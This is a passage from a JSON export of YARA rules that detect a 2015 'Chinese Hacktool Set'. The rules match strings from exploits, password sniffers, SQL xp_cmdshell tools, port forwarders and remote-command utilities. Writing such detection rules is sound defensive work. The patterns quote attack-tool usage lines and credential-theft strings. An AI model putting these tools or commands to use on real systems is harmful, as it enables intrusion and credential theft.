'xp_cmdshell','xplog70.dll'\" fullword ascii\n      $s2 = \"Password.txt\" fullword ascii\n      $s3 = \"LoginPrompt\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and all of them\n}","date":"2015-06-13 03:33:21","description":"Chinese Hacktool Set - file Project1.exe","minimum_yara":"1.7","name":"Project1_RID2A19","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"2947fb47f69c98fa6746054de6a7b090","score":70,"tags":["DEMO","EXE","FILE","HKTL","CHINA"]},{"author":"Florian Roth","content":"rule CN_Tools_MyUPnP_RID2C9A : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file MyUPnP.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:56:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<description>BYTELINKER.COM</description>\" fullword ascii\n      $s2 = \"myupnp.exe\" fullword ascii\n      $s3 = \"LOADER ERROR\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1500KB and all of them\n}","date":"2015-06-13 09:56:11","description":"Chinese Hacktool Set - file MyUPnP.exe","minimum_yara":"1.7","name":"CN_Tools_MyUPnP_RID2C9A","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"4d369fd10ed5c1d9ee59a72b93c9a732","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Tools_Shiell_RID2CD2 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file Shiell.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 10:05:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"C:\\\\Users\\\\Tong\\\\Documents\\\\Visual Studio 2012\\\\Projects\\\\Shift shell\" ascii\n      $s2 = \"C:\\\\Windows\\\\System32\\\\Shiell.exe\" fullword wide\n      $s3 = \"Shift shell.exe\" fullword wide\n      $s4 = \"\\\" /v debugger /t REG_SZ /d \\\"\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1500KB and 2 of them\n}","date":"2015-06-13 10:05:31","description":"Chinese Hacktool Set - file Shiell.exe","minimum_yara":"1.7","name":"CN_Tools_Shiell_RID2CD2","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"c40e9fcdb94240211451f0c92b0e4637","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule cndcom_cndcom_RID2C58 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file cndcom.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:45:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"- Rewritten by HDM last <hdm [at] metasploit.com>\" fullword ascii\n      $s2 = \"- Usage: %s <Target ID> <Target IP>\" fullword ascii\n      $s3 = \"- Remote DCOM RPC Buffer Overflow Exploit\" fullword ascii\n      $s4 = \"- Warning:This Code is more like a dos tool!(Modify by pingker)\" fullword ascii\n      $s5 = \"Windows NT SP6 (Chinese)\" fullword ascii\n      $s6 = \"- Original code by FlashSky and Benjurry\" fullword ascii\n      $s7 = \"\\\\C$\\\\123456111111111111111.doc\" fullword wide\n      $s8 = \"shell3all.c\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 2 of them\n}","date":"2015-06-13 09:45:11","description":"Chinese Hacktool Set - file cndcom.exe","minimum_yara":"1.7","name":"cndcom_cndcom_RID2C58","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"c774a5754c6d3277d43bb49e45dd5813","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule IsDebug_V1_4_RID2B2D : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file IsDebug V1.4.dll\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 08:55:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"IsDebug.dll\" fullword ascii\n      $s1 = \"SV Dumper V1.0\" fullword wide\n      $s2 = \"(IsDebuggerPresent byte Patcher)\" fullword ascii\n      $s8 = \"Error WriteMemory failed\" fullword ascii\n      $s9 = \"IsDebugPresent\" fullword ascii\n      $s10 = \"idb_Autoload\" fullword ascii\n      $s11 = \"Bin Files\" fullword ascii\n      $s12 = \"MASM32 version\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 30KB and all of them\n}","date":"2015-06-13 08:55:21","description":"Chinese Hacktool Set - file IsDebug V1.4.dll","minimum_yara":"1.7","name":"IsDebug_V1_4_RID2B2D","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"09baee3cc82c025d555eeb732f6a5cf4","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule HScan_v1_20_PipeCmd_and_xCmd_RID3123 : CHINA DEMO EXE FILE HKTL T1035 T1077 {\n   meta:\n      description = \"Chinese Hacktool Set - file PipeCmd.exe / xCmd.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 13:09:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL, T1035, T1077\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%SystemRoot%\\\\system32\\\\PipeCmdSrv.exe\" fullword ascii\n      $s2 = \"PipeCmd.exe\" fullword wide\n      $s3 = \"Please Use NTCmd.exe Run This Program.\" fullword ascii\n      $s4 = \"%s\\\\pipe\\\\%s%s%d\" fullword ascii\n      $s5 = \"\\\\\\\\.\\\\pipe\\\\%s%s%d\" fullword ascii\n      $s6 = \"%s\\\\ADMIN$\\\\System32\\\\%s%s\" fullword ascii\n      $s7 = \"This is a service executable! Couldn't start directly.\" fullword ascii\n      $s8 = \"Connecting to Remote Server ...Failed\" fullword ascii\n      $s9 = \"PIPECMDSRV\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 4 of them\n}","date":"2015-06-13 13:09:41","description":"Chinese Hacktool Set - file PipeCmd.exe / xCmd.exe","minimum_yara":"1.7","name":"HScan_v1_20_PipeCmd_and_xCmd_RID3123","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"78dffe7bc36704a324aaa2ab113cab11","score":75,"tags":["T1035","DEMO","EXE","FILE","CHINA","T1077","HKTL"]},{"author":"Florian Roth","content":"rule Dos_fp_RID296C : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file fp.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 22:45:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"fpipe -l 53 -s 53 -r 80 192.168.1.101\" fullword ascii\n      $s2 = \"FPipe.exe\" fullword wide\n      $s3 = \"http://www.foundstone.com\" fullword ascii\n      $s4 = \"%s %s port %d. Address is already in use\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 65KB and all of them\n}","date":"2015-06-13 22:45:01","description":"Chinese Hacktool Set - file fp.exe","minimum_yara":"1.7","name":"Dos_fp_RID296C","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"1f88d629ef127a20298070ae85d16902","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Tools_xsniff_RID2CFF : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file xsniff.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 10:13:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"xsiff.exe -pass -hide -log pass.log\" fullword ascii\n      $s1 = \"HOST: %s USER: %s, PASS: %s\" fullword ascii\n      $s2 = \"xsiff.exe -tcp -udp -asc -addr 192.168.1.1\" fullword ascii\n      $s10 = \"Code by glacier <glacier@xfocus.org>\" fullword ascii\n      $s11 = \"%-5s%s->%s Bytes=%d TTL=%d Type: %d,%d ID=%d SEQ=%d\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 220KB and 2 of them\n}","date":"2015-06-13 10:13:01","description":"Chinese Hacktool Set - file xsniff.exe","minimum_yara":"1.7","name":"CN_Tools_xsniff_RID2CFF","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"81e842044f2f98649d79f4a27463daef","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule MSSqlPass_RID2A78 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file MSSqlPass_RID2A78.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 06:11:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Reveals the passwords stored in the Registry by Enterprise Manager of SQL Server\" wide\n      $s1 = \"empv.exe\" fullword wide\n      $s2 = \"Enterprise Manager PassView\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 120KB and all of them\n}","date":"2015-06-13 06:11:41","description":"Chinese Hacktool Set - file MSSqlPass.exe","minimum_yara":"1.7","name":"MSSqlPass_RID2A78","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"c7ad5dbde500ec1c2961ba2f217ff6b4","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule WSockExpert_RID2B70 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file WSockExpert_RID2B70.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:06:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"OpenProcessCmdExecute!\" fullword ascii\n      $s2 = \"http://www.hackp.com\" fullword ascii\n      $s3 = \"'%s' is not a valid time!'%s' is not a valid date and time\" fullword wide\n      $s4 = \"SaveSelectedFilterCmdExecute\" fullword ascii\n      $s5 = \"PasswordChar@\" fullword ascii\n      $s6 = \"WSockHook.DLL\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2500KB and 4 of them\n}","date":"2015-06-13 09:06:31","description":"Chinese Hacktool Set - file WSockExpert.exe","minimum_yara":"1.7","name":"WSockExpert_RID2B70","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"b06738b43d14a160009c3ebaf8dc1083","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Ms_Viru_racle_RID2C3C : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file racle.dll\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:40:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"PsInitialSystemProcess @%p\" fullword ascii\n      $s1 = \"PsLookupProcessByProcessId(%u) Failed\" fullword ascii\n      $s2 = \"PsLookupProcessByProcessId(%u) => %p\" fullword ascii\n      $s3 = \"FirstStage() Loaded, CurrentThread @%p Stack %p - %p\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 210KB and all of them\n}","date":"2015-06-13 09:40:31","description":"Chinese Hacktool Set - file racle.dll","minimum_yara":"1.7","name":"Ms_Viru_racle_RID2C3C","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"7dbcaf614f7d01a4122dba7248ce5d4d","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule lamescan3_RID2A88 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file lamescan3_RID2A88.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 06:38:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"dic\\\\loginlist.txt\" fullword ascii\n      $s2 = \"Radmin.exe\" fullword ascii\n      $s3 = \"lamescan3_RID2A88.pdf!\" fullword ascii\n      $s4 = \"dic\\\\passlist.txt\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3740KB and all of them\n}","date":"2015-06-13 06:38:21","description":"Chinese Hacktool Set - file lamescan3.exe","minimum_yara":"1.7","name":"lamescan3_RID2A88","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"8c2528da235f8bf4ee4077b6ef9acf4a","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Dos_Down64_RID2A98 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file Down64.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 07:05:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"C:\\\\Windows\\\\Temp\\\\Down.txt\" fullword wide\n      $s2 = \"C:\\\\Windows\\\\Temp\\\\Cmd.txt\" fullword wide\n      $s3 = \"C:\\\\Windows\\\\Temp\\\\\" fullword wide\n      $s4 = \"ProcessXElement\" fullword ascii\n      $s8 = \"down.exe\" fullword wide\n      $s20 = \"set_Timer1\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 150KB and all of them\n}","date":"2015-06-13 07:05:01","description":"Chinese Hacktool Set - file Down64.exe","minimum_yara":"1.7","name":"Dos_Down64_RID2A98","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"7bee9f6409898b7e6cb32f4f89432771","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule epathobj_exp32_RID2C6F : CHINA DEMO EXE FILE HKTL T1068 {\n   meta:\n      description = \"Chinese Hacktool Set - file epathobj_exp32_RID2C6F.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:49:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL, T1068\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Watchdog thread %d waiting on Mutex\" fullword ascii\n      $s1 = \"Exploit ok run command\" fullword ascii\n      $s2 = \"\\\\epathobj_exp\\\\Release\\\\epathobj_exp.pdb\" fullword ascii\n      $s3 = \"Alllocated userspace PATHRECORD () %p\" fullword ascii\n      $s4 = \"Mutex object did not timeout, list not patched\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 270KB and all of them\n}","date":"2015-06-13 09:49:01","description":"Chinese Hacktool Set - file epathobj_exp32.exe","minimum_yara":"1.7","name":"epathobj_exp32_RID2C6F","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"0e99fe766d0d4b60ef3731e2e8497195","score":70,"tags":["T1068","DEMO","FILE","CHINA","EXE","HKTL"]},{"author":"Florian Roth","content":"rule Tools_unknown_RID2C91 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file unknown.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:54:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"No data to read.$Can not bind in port range (%d - %d)\" fullword wide\n      $s2 = \"GET /ok.asp?id=1__sql__ HTTP/1.1\" fullword ascii\n      $s3 = \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\" fullword ascii\n      $s4 = \"Failed to clear tab control Failed to delete tab at index %d\\\"Failed to retrieve\" wide\n      $s5 = \"Host: 127.0.0.1\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2500KB and 4 of them\n}","date":"2015-06-13 09:54:41","description":"Chinese Hacktool Set - file unknown.exe","minimum_yara":"1.7","name":"Tools_unknown_RID2C91","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"174aafcdc856dc5432209095fcbe84f7","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule IISPutScanner_RID2BF9 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file IISPutScanner_RID2BF9.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:29:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"KERNEL32.DLL\" fullword ascii\n      $s3 = \"ADVAPI32.DLL\" fullword ascii\n      $s4 = \"VERSION.DLL\" fullword ascii\n      $s5 = \"WSOCK32.DLL\" fullword ascii\n      $s6 = \"COMCTL32.DLL\" fullword ascii\n      $s7 = \"GDI32.DLL\" fullword ascii\n      $s8 = \"SHELL32.DLL\" fullword ascii\n      $s9 = \"USER32.DLL\" fullword ascii\n      $s10 = \"OLEAUT32.DLL\" fullword ascii\n      $s11 = \"LoadLibraryA\" fullword ascii\n      $s12 = \"GetProcAddress\" fullword ascii\n      $s13 = \"VirtualProtect\" fullword ascii\n      $s14 = \"VirtualAlloc\" fullword ascii\n      $s15 = \"VirtualFree\" fullword ascii\n      $s16 = \"ExitProcess\" fullword ascii\n      $s17 = \"RegCloseKey\" fullword ascii\n      $s18 = \"GetFileVersionInfoA\" fullword ascii\n      $s19 = \"ImageList_Add\" fullword ascii\n      $s20 = \"BitBlt\" fullword ascii\n      $s21 = \"ShellExecuteA\" fullword ascii\n      $s22 = \"ActivateKeyboardLayout\" fullword ascii\n      $s23 = \"BBABORT\" fullword wide\n      $s25 = \"BBCANCEL\" fullword wide\n      $s26 = \"BBCLOSE\" fullword wide\n      $s27 = \"BBHELP\" fullword wide\n      $s28 = \"BBIGNORE\" fullword wide\n      $s29 = \"PREVIEWGLYPH\" fullword wide\n      $s30 = \"DLGTEMPLATE\" fullword wide\n      $s31 = \"TABOUTBOX\" fullword wide\n      $s32 = \"TFORM1\" fullword wide\n      $s33 = \"MAINICON\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and filesize > 350KB and all of them\n}","date":"2015-06-13 09:29:21","description":"Chinese Hacktool Set - file IISPutScanner.exe","minimum_yara":"1.7","name":"IISPutScanner_RID2BF9","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"f42ccf0be8b1e856a7daa5ec6b4dd6fc","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule IDTools_For_WinXP_IdtTool_2_RID3119 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file IdtTool.sys\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 13:08:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\Device\\\\devIdtTool\" fullword wide\n      $s1 = \"IoDeleteSymbolicLink\" fullword ascii\n      $s3 = \"IoDeleteDevice\" fullword ascii\n      $s6 = \"IoCreateSymbolicLink\" fullword ascii\n      $s7 = \"IoCreateDevice\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 7KB and all of them\n}","date":"2015-06-13 13:08:01","description":"Chinese Hacktool Set - file IdtTool.sys","minimum_yara":"1.7","name":"IDTools_For_WinXP_IdtTool_2_RID3119","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"9aeadab485566a8f4253e441d7febc82","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule hkmjjiis6_RID2AA0 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file hkmjjiis6_RID2AA0.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 07:18:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"comspec\" fullword ascii\n      $s2 = \"user32.dlly\" ascii\n      $s3 = \"runtime error\" ascii\n      $s4 = \"WinSta0\\\\Defau\" ascii\n      $s5 = \"AppIDFlags\" fullword ascii\n      $s6 = \"GetLag\" fullword ascii\n      $s7 = \"* FROM IIsWebInfo\" ascii\n      $s8 = \"wmiprvse.exe\" ascii\n      $s9 = \"LookupAcc\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 70KB and all of them\n}","date":"2015-06-13 07:18:21","description":"Chinese Hacktool Set - file hkmjjiis6.exe","minimum_yara":"1.7","name":"hkmjjiis6_RID2AA0","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"b5b3007ff00a3a6aa2b1f5d48e16b40e","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Dos_lcx_RID29DD : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file lcx.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 01:53:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"c:\\\\Users\\\\careful_snow\\\\\" ascii\n      $s1 = \"Desktop\\\\Htran\\\\Release\\\\Htran.pdb\" ascii\n      $s3 = \"[SERVER]connection to %s:%d error\" fullword ascii\n      $s4 = \"-tran  <ConnectPort> <TransmitHost> <TransmitPort>\" fullword ascii\n      $s6 = \"=========== Code by lion & bkbll, Welcome to [url]http://www.cnhonker.com[/url] \" ascii\n      $s7 = \"[-] There is a error...Create a new connection.\" fullword ascii\n      $s8 = \"[+] Accept a Client on port %d from %s\" fullword ascii\n      $s11 = \"-slave  <ConnectHost> <ConnectPort> <TransmitHost> <TransmitPort>\" fullword ascii\n      $s13 = \"[+] Make a Connection to %s:%d....\" fullword ascii\n      $s16 = \"-listen <ConnectPort> <TransmitPort>\" fullword ascii\n      $s17 = \"[+] Waiting another Client on port:%d....\" fullword ascii\n      $s18 = \"[+] Accept a Client on port %d from %s ......\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 2 of them\n}","date":"2015-06-13 01:53:21","description":"Chinese Hacktool Set - file lcx.exe","minimum_yara":"1.7","name":"Dos_lcx_RID29DD","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"60f1c514beeda7798fe7b94a80881cc6","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule x_way2_5_X_way_RID2C66 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file X-way.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:47:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"TTFTPSERVERFRM\" fullword wide\n      $s1 = \"TPORTSCANSETFRM\" fullword wide\n      $s2 = \"TIISSHELLFRM\" fullword wide\n      $s3 = \"TADVSCANSETFRM\" fullword wide\n      $s4 = \"ntwdblib.dll\" fullword ascii\n      $s5 = \"TSNIFFERFRM\" fullword wide\n      $s6 = \"TCRACKSETFRM\" fullword wide\n      $s7 = \"TCRACKFRM\" fullword wide\n      $s8 = \"dbnextrow\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 5 of them\n}","date":"2015-06-13 09:47:31","description":"Chinese Hacktool Set - file X-way.exe","minimum_yara":"1.7","name":"x_way2_5_X_way_RID2C66","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"6747b8836fa8745c96089edb8a9943c6","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule tools_Sqlcmd_RID2C05 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file Sqlcmd.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:31:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"[Usage]:  %s <HostName|IP> <UserName> <Password>\" fullword ascii\n      $s1 = \"=============By uhhuhy(Feb 18,2003) - http://www.cnhonker.net=============\" fullword ascii\n      $s4 = \"Cool! Connected to SQL server on %s successfully!\" fullword ascii\n      $s5 = \"EXEC master..xp_cmdshell \\\"%s\\\"\" fullword ascii\n      $s6 = \"=======================Sqlcmd v0.21 For HScan v1.20=======================\" fullword ascii\n      $s10 = \"Error,exit!\" fullword ascii\n      $s11 = \"Sqlcmd>\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 40KB and 3 of them\n}","date":"2015-06-13 09:31:21","description":"Chinese Hacktool Set - file Sqlcmd.exe","minimum_yara":"1.7","name":"tools_Sqlcmd_RID2C05","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"acaa57fceebfa8b196b20ee49b3dc93e","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Sword1_5_RID29E5 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file Sword1.5.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 02:06:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"http://www.ip138.com/ip2city.asp\" fullword wide\n      $s4 = \"http://www.md5decrypter.co.uk/feed/api.aspx?\" fullword wide\n      $s6 = \"ListBox_Command\" fullword wide\n      $s13 = \"md=7fef6171469e80d32c0559f88b377245&submit=MD5+Crack\" fullword wide\n      $s18 = 